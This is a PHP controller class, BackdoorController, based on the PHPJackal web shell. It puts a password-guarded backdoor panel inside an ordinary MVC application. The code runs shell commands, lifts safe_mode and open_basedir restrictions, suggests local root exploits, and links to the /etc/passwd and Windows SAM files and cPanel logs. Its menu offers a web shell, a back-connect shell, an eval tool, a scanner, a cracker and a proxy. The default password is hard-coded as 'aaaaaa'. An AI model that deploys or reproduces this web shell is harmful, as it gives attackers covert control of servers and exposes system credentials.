<?php
/**
 * This class is based PHPJackal v2.0.2 http://h.ackerz.com
 */
namespace Codelib\Controller;

use \Light\Mvc\Controller\ControllerAbstract as ControllerAbstract;
use \Codelib\Util\Systemtool; 

class BackdoorController extends ControllerAbstract
{
    public function __construct()
    {
        $this->currentModule = 'Codelib';
        parent::__construct();

        $this->dataPath = $this->modulePath . '/data/';
        $this->baseUrl = $this->application->domain . 'codelib/back?';
        require $this->dataPath . 'function.php';
    }

    public function index()
    {
        $this->configs = $this->_getConfigs();
        $this->actions = $this->_getActions();
        $action = isset($_GET['action']) ? $_GET['action'] : '';
        $action = in_array($action, array_keys($this->actions)) ? $action : 'baseinfo';

        if ($action != 'logout') {
            $havePriv = $this->_checkLogin();
            if (empty($havePriv)) {
                $this->application->render('backdoor/login');
                exit();
            }
        }

        $this->_init();

        $method = '_' . $action . 'Method';
        $infos = $this->$method();
        $data = array(
            'baseUrl' => $this->baseUrl,
            'workPath' => $this->workPath,
            'actions' => $this->actions,
            'application' => $this->application,
        );
        $this->application->render('backdoor/index', $data);
        
    }

    private function _sysinfoMethod()
    {
        global $windows, $disablefunctions, $cwd, $safemode;
        $t8      = "<td width='25%' bgcolor='#808080'>";
        $t6      = "<td width='25%' bgcolor='#666666'>";
        $mil     = "<a target='_blank' href='http://www.milw0rm.org/related.php?program=";
        $basedir = (ini_get('open_basedir') || strtoupper(ini_get('open_basedir')) == 'ON') ? 'ON' : 'OFF';
        if (!empty($_SERVER['PROCESSOR_IDENTIFIER']))
            $CPU = $_SERVER['PROCESSOR_IDENTIFIER'];
        $osver = $tsize = $fsize = '';
        $ds    = implode(' ', $disablefunctions);
        if ($windows) {
            $osver   = ' (' . shelL('ver') . ')';
            $sysroot = shelL("echo %systemroot%");
            if (empty($sysroot))
                $sysroot = $_SERVER['SystemRoot'];
            if (empty($sysroot))
                $sysroot = getenv('windir');
            if (empty($sysroot))
                $sysroot = '没有找到';
            if (empty($CPU))
                $CPU = shelL('echo %PROCESSOR_IDENTIFIER%');
            for ($i = 66; $i <= 90; $i++) {
                $drive = chr($i) . ':\\';
                if (is_dir($drive)) {
                    $fsize += disk_free_space($drive);
                    $tsize += disk_total_space($drive);
                }
            }
        } else {
            $ap = shelL('whereis apache');
            if (!$ap)
                $ap = '未知';
            $fsize = disk_free_space('/');
            $tsize = disk_total_space('/');
        }
        $xpl = rootxpL();
        if (!$xpl)
            $xpl = 'Not found.';
        $disksize = '已使用: ' . showsizE($tsize - $fsize) . ' 空闲: ' . showsizE($fsize) . ' 总容量: ' . showsizE($tsize);
        if (empty($CPU))
            $CPU = '未知';
        $os  = php_uname();
        $osn = php_uname('s');
        if (!$windows) {
            $ker  = php_uname('r');
            $o    = ($osn == 'Linux') ? 'Linux+Kernel' : $osn;
            $os   = str_replace($osn, "${mil}$o'>$osn</a>", $os);
            $os   = str_replace($ker, "${mil}Linux+Kernel'>$ker</a>", $os);
            $inpa = ':';
        } else {
            $sam  = $sysroot . "\\system32\\config\\SAM";
            $inpa = ';';
            $os   = str_replace($osn, "${mil}MS+Windows'>$osn</a>", $os);
        }
        $cuser = get_current_user();
        if (!$cuser)
            $cuser = 'Unknow';
        $software = str_replace('Apache', "${mil}Apache'>Apache</a>", $_SERVER['SERVER_SOFTWARE']);
        echo "<table border=0 cellpadding=0 cellspacing=0 style='border-collapse: collapse' bgcolor='#333333' width='100%'><tr><td>服务器信息:</td></tr><tr>${t6}服务器:</td><td bgcolor='#666666'>" . $_SERVER['HTTP_HOST'];
        if (!empty($_SERVER["SERVER_ADDR"])) {
            echo "(" . $_SERVER["SERVER_ADDR"] . ")";
        }
        echo "</td></tr><tr>${t8}操作系统/OS:</td><td bgcolor='#808080'>$os$osver</td></tr><tr>${t6}web服务器程序:</td><td bgcolor='#666666'>$software</td></tr><tr>${t8}CPU:</td><td bgcolor='#808080'>$CPU</td></tr>${t6}磁盘状况:</td><td bgcolor='#666666'>$disksize</td></tr><tr>${t8}用户域名:</td><td bgcolor='#808080'>";
        if (!empty($_SERVER['USERDOMAIN']))
            echo $_SERVER['USERDOMAIN'];
        else
            echo "Unknow";
        echo "</td></tr><tr>${t6}用户名:</td><td bgcolor='#666666'>$cuser</td></tr>";
        if ($windows) {
            echo "<tr>${t8}Windows 目录:</td><td bgcolor='#808080'><a href='" . hlinK("seC=fm&workingdiR=$sysroot") . "'>$sysroot</a></td></tr><tr>${t6}Sam file:</td><td bgcolor='#666666'>";
            if (is_readable(($sam)))
                echo "<a href='" . hlinK("?workingdiR=$sysroot\\system32\\config&downloaD=sam") . "'>Readable</a>";
            else
                echo 'Not readable';
            echo '</td></tr>';
        } else {
            echo "<tr>${t8}UID - GID:</td><td bgcolor='#808080'>" . getmyuid() . ' - ' . getmygid() . "</td></tr><tr>${t6}Recommended local root exploits:</td><td bgcolor='#666666'>$xpl</td></tr><tr>${t8}Passwd file:</td><td bgcolor='#808080'>";
            if (is_readable('/etc/passwd'))
                echo "<a href='" . hlinK("seC=edit&filE=/etc/passwd&workingdiR=$cwd") . "'>Readable</a>";
            else
                echo 'Not readable';
            echo "</td></tr><tr>${t6}${mil}cpanel'>cPanel</a>:</td><td bgcolor='#666666'>";
            $cp = '/usr/local/cpanel/version';
            $cv = (file_exists($cp) && is_writable($cp)) ? trim(file_get_contents($cp)) : 'Unknow';
            echo "$cv (Log file: ";
            if (file_exists('/var/cpanel/accounting.log')) {
                if (is_readable('/var/cpanel/accounting.log'))
                    echo "<a href='" . hlinK("seC=edit&filE=/var/cpanel/accounting.log&workingdiR=$cwd") . "'>Readable</a>";
                else
                    echo 'Not readable';
            } else
                echo 'Not found';
            echo ')</td></tr>';
        }
        echo "<tr>$t8${mil}PHP'>PHP</a> version:</td><td bgcolor='#808080'><a href='?=" . php_logo_guid() . "' target='_blank'>" . PHP_VERSION . "</a> (<a href='" . hlinK("seC=phpinfo&workingdiR=$cwd") . "'>more...</a>)</td></tr><tr>${t6}Zend version:</td><td bgcolor='#666666'>";
        if (function_exists('zend_version'))
            echo "<a href='?=" . zend_logo_guid() . "' target='_blank'>" . zend_version() . '</a>';
        else
            echo 'Not Found';
        echo "</td><tr>${t8}Include path:</td><td bgcolor='#808080'>" . str_replace($inpa, ' ', DEFAULT_INCLUDE_PATH) . "</td><tr>${t6}PHP Modules:</td><td bgcolor='#666666'>";
        $ext = get_loaded_extensions();
        foreach ($ext as $v) {
            $i = phpversion($v);
            if (!empty($i))
                $i = "($i)";
            $l = hlinK("exT=$v");
            echo "<a href='javascript:void(0)' onclick=\"window.open('$l','','width=300,height=200,scrollbars=yes')\">$v</a> $i ";
        }
        echo "</td><tr>${t8}Disabled functions:</td><td bgcolor='#808080'>";
        if (!empty($ds))
            echo "$ds ";
        else
            echo 'Nothing';
        echo "</td></tr><tr>${t6}Safe mode:</td><td bgcolor='#666666'>$safemode</td></tr><tr>${t8}Open base dir:</td><td bgcolor='#808080'>$basedir</td></tr><tr>${t6}DBMS:</td><td bgcolor='#666666'>";
        $sq = '';
        if (function_exists('mysql_connect'))
            $sq = "${mil}MySQL'>MySQL</a> ";
        if (function_exists('mssql_connect'))
            $sq .= " ${mil}MSSQL'>MSSQL</a> ";
        if (function_exists('ora_logon'))
            $sq .= " ${mil}Oracle'>Oracle</a> ";
        if (function_exists('sqlite_open'))
            $sq .= ' SQLite ';
        if (function_exists('pg_connect'))
            $sq .= " ${mil}PostgreSQL'>PostgreSQL</a> ";
        if (function_exists('msql_connect'))
            $sq .= ' mSQL ';
        if (function_exists('mysqli_connect'))
            $sq .= ' MySQLi ';
        if (function_exists('ovrimos_connect'))
            $sq .= ' Ovrimos SQL ';
        if ($sq == '')
            $sq = 'Nothing';
        echo "$sq</td></tr></table>";
    }

    private function _logoutMethod()
    {
        setcookie('codelib_backdoor', '', time() - 10000);
        $this->application->redirect($this->baseUrl);
    }

    private function _baseinfoMethod()
    {
    }

    private function _checkLogin()
    {
        if (empty($this->configs['loginPassword'])) {
            return true;
        }

        $haveLogin = isset($_COOKIE['codelib_backdoor']) ? $_COOKIE['codelib_backdoor'] : '';
        if (!empty($haveLogin) && $haveLogin == md5($this->configs['loginPassword'])) {
            return true;
        }

        $password = isset($_GET['password']) ? $_GET['password'] : '';
        if ($password == $this->configs['loginPassword']) {
            setcookie('codelib_backdoor', md5($password));
            $this->application->redirect($this->baseUrl);
            return true;
        }

        return false;
    }

    private function _getConfigs()
    {
        $configs = array(
            'loginPassword' => 'aaaaaa',
            'email' => '',
            'allowedIps' => array(),
        );

        return $configs;
    }

    private function _init()
    {
        set_time_limit(0);
        ini_set('max_execution_time','0');
        ini_set('memory_limit','9999M');
        ini_set('output_buffering',0);
        @set_magic_quotes_runtime(0);

        $this->safeMode = (ini_get('safe_mode') || strtolower(ini_get('safe_mode')) == 'on') ? true : false;
        if ($this->safeMode) {
            ini_restore('safe_mode');
            ini_restore('open_basedir');
        }

        header('Cache-Control: no-cache, must-revalidate');
        header('Expires: Mon, 7 Aug 1987 05:00:00 GMT');

        $this->ip = $this->ip;
        if (!empty($this->configs['allowedIps']) && !in_array($this->ip, $this->configs['allowedIps'])) {
            exit("IP '{$this->ip}' not allowed");
        }

        $this->isWin = (substr((strtoupper(php_uname())), 0, 3) == 'WIN') ? true : false;

        $this->workPath = isset($_GET['workPath']) ? $_GET['workPath'] : getcwd();
        chdir($this->workPath);

        $disableFunctions = ini_get('disable_functions');
        $this->disableFunctions = explode(',', $disableFunctions);
    }

    private function _getActions()
    {
        $actions = array(
            'sysinfo' => '信息',
            'filemanager' => '文件管理器',
            'editor' => '编辑器',
            'webshell' => 'Web脚本',
            'brshell' => 'BR脚本',
            'safemodel' => '安全模式',
            'sql' => '数据库',
            'ftp' => 'FTP',
            'email' => '邮件',
            'evaler' => 'EVALER',
            'sc' => '扫描器',
            'cr' => '破解器',
            'poxry' => '代理',
            'tools' => '工具',
            'calc' => '转换器',
            'baseinfo' => '关于',
            'logout' => '退出',
        );

        return $actions;
    }
}
